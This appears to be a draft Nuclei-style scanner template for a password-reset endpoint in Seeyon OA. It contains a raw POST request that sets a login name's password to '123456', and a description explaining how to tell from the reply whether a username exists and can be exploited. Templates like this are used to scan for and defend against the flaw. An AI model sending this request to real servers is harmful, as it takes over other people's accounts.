id: seeyon-phoneLogin-resetPassword
info:
  name: Template Name
  author: wangzong
  severity: high
  description: loginName字段值需要真实存在的用户名，用户不存在时响应回显json数据字段code为500，用户真实存在且可以被利用时回显code为4。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
        Content-Type: application/json
        Accept-Encoding: gzip
        Content-Length: 56

        {"loginName":"vdkjfhgigfsjd34rvsdj","password":"123456"}
    matchers:
      - type: word
        part: header
        words:
          - '500'
